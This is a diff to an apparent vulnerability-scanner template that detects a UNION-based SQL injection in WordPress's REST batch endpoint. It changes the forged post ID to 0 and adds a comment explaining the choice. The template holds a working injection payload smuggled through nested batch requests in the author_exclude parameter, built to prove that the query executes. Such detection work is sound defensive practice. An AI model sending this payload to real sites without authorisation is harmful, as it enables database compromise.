@@ -51,7 +51,10 @@ actions: {
   # wp2shell_factor_a }}*{{ wp2shell_factor_b }}` lands in the `post_title`
   # field (column 6) and is echoed back as "||{{ wp2shell_product_hex }}||".
   # The two factors are multiplied by the SQL server itself so a match proves
-  # the query is actually parsed and executed.
+  # the query is actually parsed and executed. The forged row (and the
+  # /wp/v2/posts/<id> vehicle used to smuggle it) both use post ID 0, which
+  # is never a real WordPress post ID (auto-increment starts at 1) to avoid
+  # any collision with real content.
   name: "exploit_batch_v1_union_sqli"
   http_request: {
     method: POST
@@ -59,7 +62,7 @@ actions: {
     headers: [
       { name: "Content-Type" value: "application/json" }
     ]
-    data: "{\"requests\": [{\"method\": \"POST\", \"path\": \"http://:\"}, {\"method\": \"POST\", \"path\": \"/wp/v2/posts\", \"body\": {\"requests\": [{\"method\": \"GET\", \"path\": \"http://:\"}, {\"method\": \"GET\", \"path\": \"/wp/v2/posts/999999?author_exclude=0%29+UNION+SELECT+999999%2C2%2C0x{{ wp2shell_date_hex }}%2C0x{{ wp2shell_date_hex }}%2C5%2CCONCAT%280x7c7c%2CHEX%28CAST%28%28SELECT+{{ wp2shell_factor_a }}%2A{{ wp2shell_factor_b }}%29AS+CHAR%29%29%2C0x7c7c%29%2C7%2C0x7075626c697368%2C9%2C10%2C11%2C12%2C13%2C14%2C0x{{ wp2shell_date_hex }}%2C0x{{ wp2shell_date_hex }}%2C17%2C18%2C19%2C20%2C0x706f7374%2C22%2C23--+-&orderby=none&per_page=500\"}, {\"method\": \"GET\", \"path\": \"/wp/v2/posts\"}]}}, {\"method\": \"POST\", \"path\": \"/batch/v1\"}]}"
+    data: "{\"requests\": [{\"method\": \"POST\", \"path\": \"http://:\"}, {\"method\": \"POST\", \"path\": \"/wp/v2/posts\", \"body\": {\"requests\": [{\"method\": \"GET\", \"path\": \"http://:\"}, {\"method\": \"GET\", \"path\": \"/wp/v2/posts/0?author_exclude=0%29+UNION+SELECT+0%2C2%2C0x{{ wp2shell_date_hex }}%2C0x{{ wp2shell_date_hex }}%2C5%2CCONCAT%280x7c7c%2CHEX%28CAST%28%28SELECT+{{ wp2shell_factor_a }}%2A{{ wp2shell_factor_b }}%29AS+CHAR%29%29%2C0x7c7c%29%2C7%2C0x7075626c697368%2C9%2C10%2C11%2C12%2C13%2C14%2C0x{{ wp2shell_date_hex }}%2C0x{{ wp2shell_date_hex }}%2C17%2C18%2C19%2C20%2C0x706f7374%2C22%2C23--+-&orderby=none&per_page=500\"}, {\"method\": \"GET\", \"path\": \"/wp/v2/posts\"}]}}, {\"method\": \"POST\", \"path\": \"/batch/v1\"}]}"
     response: {
       http_status: 207
       expect_all: {
